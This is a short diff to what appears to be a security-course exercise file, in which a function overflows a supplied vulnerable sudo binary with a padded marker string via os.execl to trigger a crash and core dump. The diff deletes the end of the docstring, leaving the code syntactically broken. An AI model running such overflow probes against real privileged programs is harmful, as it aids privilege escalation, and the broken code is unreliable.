@@ -5,12 +5,6 @@ import sys
 def crash_sudo(path_to_sudo: str):
     """
     Execute the sudo program so that it crashes and generates a core dump.
-
-    The same rules and tips from q1.py still apply (you must use the
-    `path_to_sudo` value, prefer `os.execl` over `os.system`).
-
-    :param path_to_sudo: The path to the vulnerable sudo program.
-    """
     payload =("A"*65  + "BBBB" + "CCCC" + "DDDD" + "EEEE" +  "FFFF" +  "GGGG" +  "HHHH" + "IIII" + "JJJJ")  
     os.execl(path_to_sudo,path_to_sudo,payload,"/bin/sh")
 
